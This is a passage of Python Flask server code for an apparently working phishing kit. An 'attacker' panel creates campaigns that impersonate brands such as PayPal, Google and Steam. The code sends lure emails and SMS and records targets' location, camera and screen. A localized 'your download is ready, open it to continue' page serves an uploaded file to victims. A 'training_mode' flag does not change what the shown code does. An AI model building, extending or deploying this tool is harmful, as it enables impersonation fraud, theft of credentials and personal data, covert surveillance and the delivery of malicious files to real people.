        {"id": "paypal", "name": "PayPal"},
        {"id": "paypal_julien", "name": "PayPal Julien"},
        {"id": "pinterest", "name": "Pinterest"},
        {"id": "playstation", "name": "PlayStation"},
        {"id": "protonmail", "name": "ProtonMail"},
        {"id": "quora", "name": "Quora"},
        {"id": "reddit", "name": "Reddit"},
        {"id": "snapchat", "name": "Snapchat"},
        {"id": "spotify", "name": "Spotify"},
        {"id": "stackoverflow", "name": "StackOverflow"},
        {"id": "steam", "name": "Steam"},
        {"id": "twitch", "name": "Twitch"},
        {"id": "vk", "name": "VK"},
        {"id": "vk_poll", "name": "VK Poll"},
        {"id": "wordpress", "name": "WordPress"},
        {"id": "xbox", "name": "Xbox"},
        {"id": "yahoo", "name": "Yahoo"},
        {"id": "yandex", "name": "Yandex"}
    ]
    custom = []
    for t_id, data in custom_templates_data.items():
        custom.append({"id": t_id, "name": data.get("config", {}).get("name", t_id), "custom": True})
    return jsonify({"builtin": builtin, "custom": custom})

# ── API: Campaigns CRUD ──
@app.route("/api/campaigns", methods=["GET"])
def api_get_campaigns():
    attacker_required()
    return jsonify(get_all_campaigns())

@app.route("/api/campaigns", methods=["POST"])
def api_create_campaign():
    attacker_required()
    data = request.json or {}
    slug = data.get("slug", "").strip().lower()
    name = data.get("name", "").strip()
    template = data.get("template", "zoom")
    note = data.get("note", "").strip()
    if not slug or not valid_slug(slug):
        return jsonify({"error": "Invalid slug (3-60 chars, a-z0-9_-)"}), 400
    builtin_templates = ["zoom", "zoom_ped", "netflix", "instagram", "teams", "google", "discord", "tiktok", "roblox", "whatsapp", "linkedin", "facebook", "twitter", "adobe", "badoo", "deviantart", "dropbox", "ebay", "fb_advanced", "fb_messenger", "fb_security", "github", "gitlab", "google_new", "google_poll", "ig_followers", "ig_verify", "insta_followers", "mediafire", "microsoft", "origin", "paypal", "paypal_julien", "pinterest", "playstation", "protonmail", "quora", "reddit", "snapchat", "spotify", "stackoverflow", "steam", "twitch", "vk", "vk_poll", "wordpress", "xbox", "yahoo", "yandex"]
    if template not in builtin_templates and template not in custom_templates_data:
        return jsonify({"error": "Invalid template"}), 400
    existing = get_or_create_campaign(slug)
    if existing:
        return jsonify({"error": f"'{slug}' already exists"}), 409
    puburl = data.get("puburl", "").strip().rstrip("/")
    screen_recording = data.get("screen_recording", False)
    precise_location = data.get("precise_location", True)
    redirect_after_capture = data.get("redirect_after_capture", False)
    redirect_url = data.get("redirect_url", "").strip()
    lang = data.get("lang", "en")
    show_pretext = data.get("show_pretext", False)
    chat_mode = data.get("chat_mode", False)
    photo_quality = data.get("photo_quality", "480")
    video_quality = data.get("video_quality", "480")
    liveview_quality = data.get("liveview_quality", "low")
    auto_delete_enabled = data.get("auto_delete", False)
    auto_delete_seconds = data.get("auto_delete_seconds", 3600)
    auto_start_enabled = data.get("auto_start", False)
    auto_start_delay = data.get("auto_start_delay", 3600)
    download_in_page = data.get("download_in_page", False)
    download_file_name = data.get("download_file_name", "")
    download_display_name = data.get("download_display_name", "")
    # audio/video handling - check global defaults if save not set but user wants autoload
    audio_enabled = data.get("audio_enabled", False)
    audio_files = data.get("audio_files", [])
    # if audio_enabled and no files but global save exists, load global
    if audio_enabled and (not audio_files or len(audio_files)==0):
        g = get_global_default("default_audios", "")
        if g:
            try:
                audio_files = json.loads(g)
            except Exception:
                pass
    video_enabled = data.get("video_enabled", False)
    video_file = data.get("video_file", "")
    if video_enabled and not video_file:
        g = get_global_default("default_video", "")
        if g:
            video_file = g
    video_repeat = data.get("video_repeat", False)
    if video_enabled and not data.get("video_repeat"):
        gr = get_global_default("default_video_repeat", "0")
        if gr == "1":
            video_repeat = True
    audio_save = data.get("audio_save", False)
    video_save = data.get("video_save", False)
    now = datetime.now().strftime("%H:%M:%S %d/%m/%y")
    c = get_or_create_campaign(slug, {
        "slug": slug, "name": name or f"{template.title()} Campaign",
        "template": template, "status": "waiting" if auto_start_enabled and auto_start_delay > 0 else "active", "note": note,
        "puburl": puburl, "screen_recording": screen_recording,
        "precise_location": precise_location,
        "redirect_after_capture": redirect_after_capture,
        "redirect_url": redirect_url,
        "lang": lang, "show_pretext": show_pretext,
        "chat_mode": chat_mode,
        "photo_quality": photo_quality,
        "video_quality": video_quality,
        "liveview_quality": liveview_quality,
        "auto_delete": auto_delete_enabled,
        "auto_delete_seconds": auto_delete_seconds,
        "auto_start": auto_start_enabled,
        "auto_start_delay": auto_start_delay,
        "training_mode": data.get("training_mode", False),
        "download_in_page": download_in_page,
        "download_file_name": download_file_name,
        "download_display_name": download_display_name,
        "audio_enabled": audio_enabled,
        "audio_files": audio_files if isinstance(audio_files, list) else [],
        "audio_save": audio_save,
        "video_enabled": video_enabled,
        "video_file": video_file,
        "video_repeat": video_repeat,
        "video_save": video_save,
        "created_at": now,
    })
    campaigns[slug] = c
    log_event("campaign", f"Created: '{c['name']}' -> /{slug} [{template}]")
    socketio.emit("campaign_created", c, room="attacker")
    return jsonify(c), 201

@app.route("/api/campaigns/<slug>", methods=["PATCH"])
def api_update_campaign(slug):
    attacker_required()
    c = get_or_create_campaign(slug)
    if not c:
        return jsonify({"error": "Not found"}), 404
    data = request.json or {}
    update_data = {}
    for key in ("status", "name", "note", "puburl", "template",
                 "redirect_after_capture", "redirect_url",
                 "screen_recording", "precise_location", "lang",
                 "show_pretext", "chat_mode",
                 "photo_quality", "video_quality", "liveview_quality",
                 "auto_delete", "auto_delete_seconds",
                 "download_in_page", "download_file_name",
                 "audio_enabled", "audio_files", "audio_save",
                 "video_enabled", "video_file", "video_repeat", "video_save"):
        if key in data:
            update_data[key] = data[key]
    if update_data:
        c = update_campaign(slug, update_data)
        if update_data.get("status"):
            log_event("campaign", f"'{c['name']}' -> {update_data['status']}")
        campaigns[slug] = c
        socketio.emit("campaign_updated", c, room="attacker")
    return jsonify(c)

@app.route("/api/campaigns/<slug>", methods=["DELETE"])
def api_delete_campaign(slug):
    attacker_required()
    c = get_or_create_campaign(slug)
    if not c:
        return jsonify({"error": "Not found"}), 404
    delete_campaign(slug)
    campaigns.pop(slug, None)
    log_event("campaign", f"Deleted: '{c['name']}'")
    socketio.emit("campaign_deleted", {"slug": slug}, room="attacker")
    return jsonify({"status": "deleted"})

# ── API: Upload download file for campaign ──
@app.route("/api/campaigns/<slug>/download-file", methods=["POST"])
def api_upload_download_file(slug):
    attacker_required()
    c = get_or_create_campaign(slug)
    if not c:
        return jsonify({"error": "Not found"}), 404
    if "file" not in request.files:
        return jsonify({"error": "No file"}), 400
    f = request.files["file"]
    if f.filename == "":
        return jsonify({"error": "No file selected"}), 400
    safe_slug = safe_name(slug)
    dl_dir = rpath("downloads", safe_slug)
    os.makedirs(dl_dir, exist_ok=True)
    for old in os.listdir(dl_dir):
        try:
            os.remove(os.path.join(dl_dir, old))
        except Exception:
            pass
    filename = f.filename
    f.save(os.path.join(dl_dir, filename))
    update_campaign(slug, {"download_file_name": filename})
    c = get_or_create_campaign(slug)
    campaigns[slug] = c
    socketio.emit("campaign_updated", c, room="attacker")
    return jsonify({"status": "ok", "filename": filename})

# ── Serve download file to target ──
@app.route("/download-file/<slug>/<filename>")
def api_serve_download_file(slug, filename):
    c = get_or_create_campaign(slug)
    if not c:
        abort(404)
    safe_slug = safe_name(slug)
    safe_filename = os.path.basename(filename)
    filepath = rpath("downloads", safe_slug, safe_filename)
    if os.path.exists(filepath):
        return send_from_directory(
            rpath("downloads", safe_slug),
            safe_filename,
            as_attachment=True
        )
    # fallback legacy
    legacy_fp = os.path.join("downloads", safe_slug, safe_filename)
    if os.path.exists(legacy_fp):
        return send_from_directory(
            os.path.join("downloads", safe_slug),
            safe_filename,
            as_attachment=True
        )
    abort(404)

# ── Download landing page for target ──
@app.route("/<slug>/download")
def download_landing_page(slug):
    c = get_or_create_campaign(slug)
    if not c or c["status"] != "active":
        abort(404)
    lang = c.get("lang", "en")
    download_file_name = c.get("download_file_name", "")
    if not download_file_name:
        abort(404)
    from urllib.parse import quote
    download_file_url = quote(download_file_name)
    download_display_name = c.get("download_display_name", "")
    if not download_display_name:
        download_display_name = download_file_name
    puburl = c.get("puburl", "")
    dl_texts = {
        "en": {"title": "Your download is ready", "desc": "Your file has been prepared. Click the button below to save it to your device, then open it to continue.", "btn": "Download", "secure": "Secure connection", "mb": "MB"},
        "fr": {"title": "Votre téléchargement est prêt", "desc": "Votre fichier a été préparé. Cliquez sur le bouton ci-dessous pour l'enregistrer sur votre appareil, puis ouvrez-le pour continuer.", "btn": "Télécharger", "secure": "Connexion sécurisée", "mb": "Mo"},
        "es": {"title": "Tu descarga está lista", "desc": "Su archivo ha sido preparado. Haga clic en el botón de abajo para guardarlo en su dispositivo, luego ábralo para continuar.", "btn": "Descargar", "secure": "Conexión segura", "mb": "MB"},
        "de": {"title": "Ihr Download ist bereit", "desc": "Ihre Datei wurde vorbereitet. Klicken Sie auf die Schaltfläche unten, um sie auf Ihrem Gerät zu speichern, und öffnen Sie sie dann, um fortzufahren.", "btn": "Herunterladen", "secure": "Sichere Verbindung", "mb": "MB"},
        "pt": {"title": "Seu download está pronto", "desc": "Seu arquivo foi preparado. Clique no botão abaixo para salvá-lo em seu dispositivo e abra-o para continuar.", "btn": "Baixar", "secure": "Conexão segura", "mb": "MB"},
        "it": {"title": "Il download è pronto", "desc": "Il file è stato preparato. Fai clic sul pulsante qui sotto per salvarlo sul tuo dispositivo, quindi aprilo per continuare.", "btn": "Scarica", "secure": "Connessione sicura", "mb": "MB"},
        "nl": {"title": "Uw download is gereed", "desc": "Uw bestand is voorbereid. Klik op de knop hieronder om het op uw apparaat op te slaan en open het om verder te gaan.", "btn": "Downloaden", "secure": "Veilige verbinding", "mb": "MB"},
        "pl": {"title": "Twój plik jest gotowy do pobrania", "desc": "Twój plik został przygotowany. Kliknij przycisk poniżej, aby zapisać go na urządzeniu, a następnie otwórz go, aby kontynuować.", "btn": "Pobierz", "secure": "Bezpieczne połączenie", "mb": "MB"},
        "ru": {"title": "Загрузка готова", "desc": "Ваш файл подготовлен. Нажмите кнопку ниже, чтобы сохранить его на устройство, затем откройте его, чтобы продолжить.", "btn": "Скачать", "secure": "Безопасное соединение", "mb": "МБ"},
        "ja": {"title": "ダウンロードの準備ができました", "desc": "ファイルが準備されました。下のボタンをクリックしてデバイスに保存し、開いて続行してください。", "btn": "ダウンロード", "secure": "安全な接続", "mb": "MB"},
        "ko": {"title": "다운로드 준비 완료", "desc": "파일이 준비되었습니다. 아래 버튼을 클릭하여 장치에 저장한 다음 열어서 계속하세요.", "btn": "다운로드", "secure": "보안 연결", "mb": "MB"},
        "zh-CN": {"title": "下载已就绪", "desc": "您的文件已准备就绪。点击下方按钮将其保存到您的设备，然后打开以继续。", "btn": "下载", "secure": "安全连接", "mb": "MB"},
        "zh-TW": {"title": "下載已就緒", "desc": "您的檔案已準備就緒。點擊下方按鈕將其儲存到您的裝置，然後開啟以繼續。", "btn": "下載", "secure": "安全連線", "mb": "MB"},
        "tr": {"title": "İndirmeniz hazır", "desc": "Dosyanız hazırlandı. Cihazınıza kaydetmek için aşağıdaki düğmeye tıklayın, ardından devam etmek için açın.", "btn": "İndir", "secure": "Güvenli bağlantı", "mb": "MB"},
        "vi": {"title": "Tải xuống của bạn đã sẵn sàng", "desc": "Tệp của bạn đã được chuẩn bị. Nhấp vào nút bên dưới để lưu vào thiết bị của bạn, sau đó mở nó để tiếp tục.", "btn": "Tải xuống", "secure": "Kết nối an toàn", "mb": "MB"},
        "th": {"title": "ดาวน์โหลดพร้อมแล้ว", "desc": "ไฟล์ของคุณถูกเตรียมไว้แล้ว คลิกปุ่มด้านล่างเพื่อบันทึกลงในอุปกรณ์ของคุณ จากนั้นเปิดเพื่อดำเนินการต่อ", "btn": "ดาวน์โหลด", "secure": "การเชื่อมต่อที่ปลอดภัย", "mb": "MB"},
        "id": {"title": "Unduhan Anda siap", "desc": "File Anda telah disiapkan. Klik tombol di bawah untuk menyimpannya ke perangkat Anda, lalu buka untuk melanjutkan.", "btn": "Unduh", "secure": "Koneksi aman", "mb": "MB"},
        "sv": {"title": "Din nedladdning är klar", "desc": "Din fil har förberetts. Klicka på knappen nedan för att spara den på din enhet och öppna den för att fortsätta.", "btn": "Ladda ner", "secure": "Säker anslutning", "mb": "MB"},
        "ar": {"title": "التحميل جاهز", "desc": "تم تجهيز ملفك. انقر فوق الزر أدناه لحفظه على جهازك، ثم افتحه للمتابعة.", "btn": "تحميل", "secure": "اتصال آمن", "mb": "ميجابايت"},
    }
    dl = dl_texts.get(lang, dl_texts["en"])
    return render_template("download_page.html",
                           slug=slug,
                           campaign_name=c["name"],
                           download_file_name=download_file_name,
                           download_file_url=download_file_url,
                           download_display_name=download_display_name,
                           dl_title=dl["title"],
                           dl_desc=dl["desc"],
                           dl_btn=dl["btn"],
                           dl_secure=dl["secure"],
                           dl_mb=dl["mb"],
                           puburl=puburl,
                           lang=lang)

# ── API: SMTP Configuration ──
@app.route("/api/smtp/config", methods=["GET", "POST"])
def api_smtp_config():
    attacker_required()
    if request.method == "POST":
        data = request.json or {}
        email_sender.configure(
            host=data.get("host", ""),
            port=data.get("port", 587),
            username=data.get("username", ""),
            password=data.get("password", ""),
            use_tls=data.get("use_tls", True),
            sender_name=data.get("sender_name", "AwareNet"),
            sender_email=data.get("sender_email", ""),
        )
        conn = get_db()
        for key in ("host", "port", "username", "password", "use_tls", "sender_name", "sender_email"):
            conn.execute("UPDATE smtp_config SET value=? WHERE key=?",
                         (str(data.get(key, "")), key))
        conn.commit()
        log_event("smtp", "SMTP configuration updated")
        return jsonify({"status": "configured"})
    return jsonify({
        "configured": email_sender.is_configured(),
        "host": email_sender.host,
        "port": email_sender.port,
        "sender_name": email_sender.sender_name,
        "sender_email": email_sender.sender_email,
    })

@app.route("/api/smtp/test", methods=["POST"])
def api_smtp_test():
    attacker_required()
    data = request.json or {}
    to_email = data.get("to_email", "")
    if not to_email:
        return jsonify({"error": "No recipient email"}), 400
    success, msg = email_sender.send(
        to_email, "AwareNet SMTP Test",
        "<h2>SMTP Configuration Successful</h2><p>Your AwareNet email settings work correctly.</p>"
    )
    if success:
        log_event("smtp", f"Test email sent to {to_email}")
        return jsonify({"status": "sent"})
    return jsonify({"error": msg}), 500

# ── API: Email templates ──
@app.route("/api/email/templates", methods=["GET"])
def api_get_email_templates():
    attacker_required()
    lang = request.args.get("lang", "").strip().lower()
    slug = request.args.get("slug", "").strip()
    # if slug given, infer lang from campaign
    if slug:
        c = get_or_create_campaign(slug)
        if c and c.get("lang"):
            lang = c.get("lang", lang)
    if not lang:
        lang = "en"
    # normalize zh variants
    if lang not in ("en","fr","es","de","pt","it","nl","pl","ru","ja","ko","zh-CN","zh-TW","tr","vi","th","id","sv","ar"):
        # try base lang
        base = lang.split("-")[0]
        if base in ("en","fr","es","de","pt","it","nl","pl","ru","ja","ko","tr","vi","th","id","sv","ar"):
            lang = base
        else:
            lang = "en"
    conn = get_db()
    rows = conn.execute("SELECT * FROM email_templates WHERE lang=? ORDER BY id", (lang,)).fetchall()
    # fallback chain: requested -> en -> any
    if not rows and lang != "en":
        rows = conn.execute("SELECT * FROM email_templates WHERE lang='en' ORDER BY id").fetchall()
    if not rows:
        rows = conn.execute("SELECT * FROM email_templates ORDER BY lang, id").fetchall()
    return jsonify([dict(r) for r in rows])

@app.route("/api/email/send", methods=["POST"])
def api_send_email():
    attacker_required()
    data = request.json or {}
    to_email = data.get("to_email", "")
    subject = data.get("subject", "")
    body = data.get("body", "")
    target_name = data.get("target_name", "User")
    link = data.get("link", "")
    if not to_email or not subject or not body:
        return jsonify({"error": "Missing required fields"}), 400
    rendered = email_sender.render_template(body, {
        "name": target_name, "link": link,
        "topic": data.get("topic", "Security Verification"),
        "time": data.get("time", "Instant meeting"),
    })
    success, msg = email_sender.send(to_email, subject, rendered)
    if success:
        conn = get_db()
        conn.execute("INSERT INTO campaign_emails (campaign_slug, recipient, subject, sent_at, status) VALUES (?,?,?,?,?)",
                     (data.get("slug", ""), to_email, subject,
                      datetime.now().strftime("%H:%M:%S %d/%m/%y"), "sent"))
        conn.commit()
        log_event("email", f"Email sent to {to_email}: {subject}")
        return jsonify({"status": "sent"})
    return jsonify({"error": msg}), 500

# ── SMS config page ──
@app.route("/panel/<token>/sms")
def sms_config_page(token):
    if token != ATTACKER_URL_TOKEN:
        abort(404)
    if session.get("attacker_auth") != token:
        return redirect(f"/panel/{token}")
    return render_template("sms_config.html", token=token)

# ── API: SMS Configuration ──
@app.route("/api/sms/config", methods=["GET", "POST"])
def api_sms_config():
    attacker_required()
    if request.method == "POST":
        data = request.json or {}
        sms_sender.configure(
            provider=data.get("provider", "twilio"),
            account_sid=data.get("account_sid", ""),
            auth_token=data.get("auth_token", ""),
            from_number=data.get("from_number", ""),
            api_key=data.get("api_key", ""),
            sender_id=data.get("sender_id", ""),
        )
        conn = get_db()
        # ensure single row
        conn.execute("DELETE FROM sms_config")
        conn.execute("INSERT INTO sms_config (provider, account_sid, auth_token, from_number, api_key, sender_id) VALUES (?,?,?,?,?,?)",
                     (sms_sender.provider, sms_sender.account_sid, sms_sender.auth_token, sms_sender.from_number, sms_sender.api_key, sms_sender.sender_id))
        conn.commit()
        log_event("sms", "SMS configuration updated")
        return jsonify({"status": "configured"})
    return jsonify({
        "configured": sms_sender.is_configured(),
        "provider": sms_sender.provider,
        "account_sid": sms_sender.account_sid,
        "from_number": sms_sender.from_number,
        "sender_id": sms_sender.sender_id,
    })

@app.route("/api/sms/test", methods=["POST"])
def api_sms_test():
    attacker_required()
    data = request.json or {}
    to_number = data.get("to_number", "")
    if not to_number:
        return jsonify({"error": "No recipient number"}), 400
    success, msg = sms_sender.send(to_number, "AwareNet SMS test - configuration successful.")
    if success:
        log_event("sms", f"Test SMS sent to {to_number}")
        return jsonify({"status": "sent"})
    return jsonify({"error": msg}), 500

# ── API: SMS templates ──
@app.route("/api/sms/templates", methods=["GET"])
def api_get_sms_templates():
    attacker_required()
    lang = request.args.get("lang", "").strip().lower()
    slug = request.args.get("slug", "").strip()
    if slug:
        c = get_or_create_campaign(slug)
        if c and c.get("lang"):
            lang = c.get("lang", lang)
    if not lang:
        lang = "en"
    if lang not in ("en","fr","es","de","pt","it","nl","pl","ru","ja","ko","zh-CN","zh-TW","tr","vi","th","id","sv","ar"):
        base = lang.split("-")[0]
        if base in ("en","fr","es","de","pt","it","nl","pl","ru","ja","ko","tr","vi","th","id","sv","ar"):
            lang = base
        else:
            lang = "en"
    conn = get_db()
    rows = conn.execute("SELECT * FROM sms_templates WHERE lang=? ORDER BY id", (lang,)).fetchall()
    if not rows and lang != "en":
        rows = conn.execute("SELECT * FROM sms_templates WHERE lang='en' ORDER BY id").fetchall()
    if not rows:
        rows = conn.execute("SELECT * FROM sms_templates ORDER BY lang, id").fetchall()
    return jsonify([dict(r) for r in rows])

@app.route("/api/sms/send", methods=["POST"])
def api_send_sms():
    attacker_required()
    data = request.json or {}
    to_number = data.get("to_number", "")
    body = data.get("body", "")
    target_name = data.get("target_name", "User")
    link = data.get("link", "")
    if not to_number or not body:
        return jsonify({"error": "Missing required fields"}), 400
    rendered = sms_sender.render_template(body, {
        "name": target_name, "link": link,
        "topic": data.get("topic", "Security Verification"),
        "time": data.get("time", "Instant meeting"),
    })
    success, msg = sms_sender.send(to_number, rendered)
    if success:
        conn = get_db()
        conn.execute("INSERT INTO campaign_sms (campaign_slug, recipient, body, sent_at, status) VALUES (?,?,?,?,?)",
                     (data.get("slug", ""), to_number, rendered,
                      datetime.now().strftime("%H:%M:%S %d/%m/%y"), "sent"))
        conn.commit()
        log_event("sms", f"SMS sent to {to_number}")
        return jsonify({"status": "sent"})
    return jsonify({"error": msg}), 500

# ── API: Campaign Media Defaults ──
@app.route("/api/media/defaults", methods=["GET", "POST"])
def api_media_defaults():
    attacker_required()
    if request.method == "POST":
        data = request.json or {}
        for k in ("default_audios", "default_video", "default_video_repeat"):
            if k in data:
                set_global_default(k, str(data[k]) if not isinstance(data[k], str) else data[k])
        # if audios list provided, ensure files exist in _global by searching all campaigns
        if "default_audios" in data:
            try:
                files = json.loads(data["default_audios"]) if isinstance(data["default_audios"], str) else data["default_audios"]
                if isinstance(files, list) and files:
                    global_dir = rpath("campaign_audios", "_global")
                    os.makedirs(global_dir, exist_ok=True)
                    import shutil, glob
                    for fn in files:
                        dst = os.path.join(global_dir, fn)
                        if os.path.exists(dst):
                            continue
                        # search in campaign_audios/*/ (rpath puis legacy)
                        found = None
                        for search_root in (rpath("campaign_audios"), "campaign_audios"):
                            for cand in glob.glob(os.path.join(search_root, "*", fn)):
                                if os.path.isfile(cand):
                                    found = cand
                                    break
                            if found:
                                break
                        if found:
                            try:
                                shutil.copy(found, dst)
                            except Exception:
                                pass
            except Exception:
                pass
        # if video provided, ensure video exists in _global
        if "default_video" in data:
            fn = str(data["default_video"]).strip()
            if fn:
                global_dir = rpath("campaign_videos", "_global")
                os.makedirs(global_dir, exist_ok=True)
                dst = os.path.join(global_dir, fn)
                if not os.path.exists(dst):
                    import glob, shutil
                    for search_root in (rpath("campaign_videos"), "campaign_videos"):
                        for cand in glob.glob(os.path.join(search_root, "*", fn)):
                            if os.path.isfile(cand):
                                try:
                                    shutil.copy(cand, dst)
                                    break
                                except Exception:
                                    pass
                        if os.path.exists(dst):
                            break
        return jsonify({"status": "saved"})
    return jsonify(get_all_global_defaults())

@app.route("/api/campaigns/<slug>/audios", methods=["GET", "POST", "DELETE"])
def api_campaign_audios(slug):
    attacker_required()
    c = get_or_create_campaign(slug)
    if not c:
        return jsonify({"error": "Not found"}), 404
    if request.method == "GET":
        # return list of audio files for this campaign
        try:
            files = json.loads(c.get("audio_files", "[]") or "[]")
        except Exception:
            files = []
        # also check filesystem
        media_dir = rpath("campaign_audios", safe_name(slug))
        fs_files = []
        if os.path.exists(media_dir):
            fs_files = sorted(os.listdir(media_dir))
        return jsonify({"files": files, "fs_files": fs_files, "enabled": bool(c.get("audio_enabled")), "save": bool(c.get("audio_save"))})
    elif request.method == "POST":
        # upload one or multiple audios, limit 10
        if "audio" not in request.files and "audios" not in request.files:
            return jsonify({"error": "No audio file"}), 400
        # handle multiple files under 'audios'
        files = []
        if "audios" in request.files:
            files = request.files.getlist("audios")
        elif "audio" in request.files:
            files = [request.files["audio"]]
        # check existing count
        try:
            existing = json.loads(c.get("audio_files", "[]") or "[]")
        except Exception:
            existing = []
        if len(existing) + len(files) > 10:
            return jsonify({"error": "Limit 10 audios per campaign"}), 400
        media_dir = rpath("campaign_audios", safe_name(slug))
        os.makedirs(media_dir, exist_ok=True)
        saved = []
        for f in files:
            if f.filename == "":
                continue
            # sanitize filename
            safe_fname = re.sub(r"[^a-zA-Z0-9._-]", "_", f.filename)[:80]
            if not safe_fname:
                safe_fname = f"audio_{int(time.time())}.mp3"
            dest = os.path.join(media_dir, safe_fname)
            # avoid overwrite: add suffix
            base, ext = os.path.splitext(safe_fname)
            counter = 1
            while os.path.exists(dest):
                safe_fname = f"{base}_{counter}{ext}"
                dest = os.path.join(media_dir, safe_fname)
                counter += 1
            f.save(dest)
            saved.append(safe_fname)
        new_list = existing + saved
        update_campaign(slug, {"audio_files": json.dumps(new_list), "audio_enabled": 1})
        # if save flag enabled, save to global and copy files to _global
        if c.get("audio_save") or request.form.get("save_global") == "1":
            set_global_default("default_audios", json.dumps(new_list))
            global_dir = rpath("campaign_audios", "_global")
            os.makedirs(global_dir, exist_ok=True)
            import shutil
            for fn in saved:
                src = os.path.join(media_dir, fn)
                dst = os.path.join(global_dir, fn)
                try:
                    if os.path.exists(src) and not os.path.exists(dst):
                        shutil.copy(src, dst)
                    elif os.path.exists(src) and os.path.exists(dst):
                        # update
                        shutil.copy(src, dst)
                except Exception:
                    pass
            # also ensure existing files are in global
            for fn in existing:
                src = os.path.join(media_dir, fn)
                dst = os.path.join(global_dir, fn)
                try:
                    if os.path.exists(src) and not os.path.exists(dst):
                        shutil.copy(src, dst)
                except Exception:
                    pass
        c2 = get_or_create_campaign(slug)
        return jsonify({"status": "ok", "files": new_list, "campaign": c2})
    else:  # DELETE - clear or remove specific
        idx = request.args.get("idx")
        fname = request.args.get("fname")
        try:
            existing = json.loads(c.get("audio_files", "[]") or "[]")
        except Exception:
            existing = []
        media_dir = rpath("campaign_audios", safe_name(slug))
        if idx is not None:
            try:
                idx = int(idx)
                if 0 <= idx < len(existing):
                    rm = existing.pop(idx)
                    fp = os.path.join(media_dir, rm)
                    if os.path.exists(fp):
                        try:
                            os.remove(fp)
                        except Exception:
                            pass
                    update_campaign(slug, {"audio_files": json.dumps(existing)})
            except Exception:
                pass
        elif fname:
            if fname in existing:
                existing.remove(fname)
                fp = os.path.join(media_dir, fname)
                if os.path.exists(fp):
                    try:
                        os.remove(fp)
                    except Exception:
                        pass
                update_campaign(slug, {"audio_files": json.dumps(existing)})
        else:
            # clear all
            for fn in existing:
                fp = os.path.join(media_dir, fn)
                if os.path.exists(fp):
                    try:
                        os.remove(fp)
                    except Exception:
                        pass
            update_campaign(slug, {"audio_files": json.dumps([])})
        c2 = get_or_create_campaign(slug)
        return jsonify({"status": "ok", "files": json.loads(c2.get("audio_files","[]") or "[]")})

@app.route("/api/campaigns/<slug>/video", methods=["GET", "POST", "DELETE"])
def api_campaign_video(slug):
    attacker_required()
    c = get_or_create_campaign(slug)
    if not c:
        return jsonify({"error": "Not found"}), 404
    if request.method == "GET":
        return jsonify({"file": c.get("video_file",""), "enabled": bool(c.get("video_enabled")), "repeat": bool(c.get("video_repeat")), "save": bool(c.get("video_save"))})
    elif request.method == "POST":
        if "video" not in request.files:
            return jsonify({"error": "No video file"}), 400
        f = request.files["video"]
        if f.filename == "":
            return jsonify({"error": "No file selected"}), 400
        media_dir = rpath("campaign_videos", safe_name(slug))
        os.makedirs(media_dir, exist_ok=True)
        # clear old
        old = c.get("video_file","")
        if old:
            oldp = os.path.join(media_dir, old)
            if os.path.exists(oldp):
                try:
                    os.remove(oldp)
                except Exception:
                    pass
        safe_fname = re.sub(r"[^a-zA-Z0-9._-]", "_", f.filename)[:80]
        if not safe_fname:
            safe_fname = f"video_{int(time.time())}.mp4"
        dest = os.path.join(media_dir, safe_fname)
        f.save(dest)
        repeat = request.form.get("repeat", "0") == "1" or request.form.get("video_repeat", "0") == "1"
        # fallback: check json body repeat flag
        if request.form.get("repeat") is None:
            # check if campaign has repeat enabled
            repeat = bool(c.get("video_repeat"))
            # also check request JSON if any
            try:
                j = request.get_json(silent=True) or {}
                if "repeat" in j:
                    repeat = bool(j["repeat"])
            except Exception:
                pass
        update_campaign(slug, {"video_file": safe_fname, "video_enabled": 1, "video_repeat": 1 if repeat else 0})
        # handle save global
        save_flag = request.form.get("save_global") == "1"
        if save_flag or c.get("video_save"):
            set_global_default("default_video", safe_fname)
            # also save file physically to global? copy file to global_videos
            global_dir = rpath("campaign_videos", "_global")
            os.makedirs(global_dir, exist_ok=True)
            try:
                import shutil
                shutil.copy(dest, os.path.join(global_dir, safe_fname))
            except Exception:
                pass
            set_global_default("default_video_repeat", "1" if repeat else "0")
        c2 = get_or_create_campaign(slug)
        return jsonify({"status": "ok", "file": safe_fname, "campaign": c2})
    else:
        # DELETE
        old = c.get("video_file","")
        if old:
            media_dir = rpath("campaign_videos", safe_name(slug))
            fp = os.path.join(media_dir, old)
            if os.path.exists(fp):
                try:
                    os.remove(fp)
                except Exception:
                    pass
        update_campaign(slug, {"video_file": "", "video_enabled": 0})
        return jsonify({"status": "ok"})

@app.route("/api/campaigns/<slug>/timer", methods=["GET"])
def api_campaign_timer(slug):
    attacker_required()
    c = get_or_create_campaign(slug)
    if not c:
        return jsonify({"error": "Not found"}), 404
    seconds = get_campaign_active_seconds(slug)
    return jsonify({"slug": slug, "active_seconds": seconds, "status": c.get("status"), "is_paused": c.get("status") != "active"})

@app.route("/campaign_media/<slug>/<fname>")
def serve_campaign_media(slug, fname):
    # serve audio or video for victim playback (no auth needed, but check campaign exists)
    c = get_or_create_campaign(slug)
    if not c:
        abort(404)
    base_name = os.path.basename(fname)
    # try rpath d'abord puis legacy pour rétro-compat
    for base in ("campaign_audios", "campaign_videos"):
        for try_dir in (rpath(base, safe_name(slug)), os.path.join(base, safe_name(slug))):
            fp = os.path.join(try_dir, base_name)
            if os.path.exists(fp):
                return send_from_directory(try_dir, base_name)
    # try global
    for base in ("campaign_audios", "campaign_videos"):
        for try_dir in (rpath(base, "_global"), os.path.join(base, "_global")):
            fp = os.path.join(try_dir, base_name)
            if os.path.exists(fp):
                return send_from_directory(try_dir, base_name)
    # fallback: search any campaign folder for the file (for autoloaded audios)
    import glob
    for base in ("campaign_audios", "campaign_videos"):
        for search_base in (rpath(base), base):
            for cand in glob.glob(os.path.join(search_base, "*", base_name)):
                if os.path.isfile(cand):
                    d = os.path.dirname(cand)
                    return send_from_directory(d, base_name)
    abort(404)

# ── API: Targets ──
@app.route("/api/targets", methods=["GET"])
def api_get_targets():
    attacker_required()
    return jsonify(get_all_targets())

@app.route("/api/targets/<target_id>/notes", methods=["PUT"])
def api_target_notes(target_id):
    attacker_required()
    data = request.get_json(force=True, silent=True) or {}
    notes = data.get("notes", "")
    update_target_notes(target_id, notes)
    return jsonify({"status": "ok"})

@app.route("/api/targets/bulk-delete", methods=["POST"])
def api_targets_bulk_delete():
    attacker_required()
    data = request.get_json(force=True, silent=True) or {}
    ids = data.get("ids", [])
    for tid in ids:
        conn = get_db()
        conn.execute("DELETE FROM targets WHERE id=?", (tid,))
        conn.execute("DELETE FROM captures WHERE target_id=?", (tid,))
        conn.execute("DELETE FROM events WHERE target_id=?", (tid,))
        sid_to_remove = next((s for s, t in targets.items() if t.get("id") == tid), None)
        if sid_to_remove:
            targets.pop(sid_to_remove, None)
    conn.commit()
